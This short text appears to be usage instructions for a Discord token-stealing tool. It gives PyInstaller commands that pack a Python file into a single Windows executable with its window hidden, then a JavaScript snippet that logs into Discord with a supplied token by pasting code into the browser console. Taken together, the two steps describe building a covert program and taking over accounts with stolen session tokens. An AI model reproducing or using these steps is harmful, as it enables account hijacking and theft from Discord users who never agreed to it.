pip install pyinstaller==3.4
pyinstaller -F -w --paths C:\Windows\System32\downlevel file.py

pyinstaller --- module to convert it

-F --- make 1 standalone file exe should be in the dist folder (delete pycache and build folder if u want)

-w --- hides the terminal when executed

file.py --- the file

to login to discord with token, go to https://discord.com/login and inspect element, then go to console tab and paste the code.

function login(token) {
setInterval(() => {
document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
}, 50);
setTimeout(() => {
location.reload();
}, 2500);
}

login('TOKEN GOES HERE!')
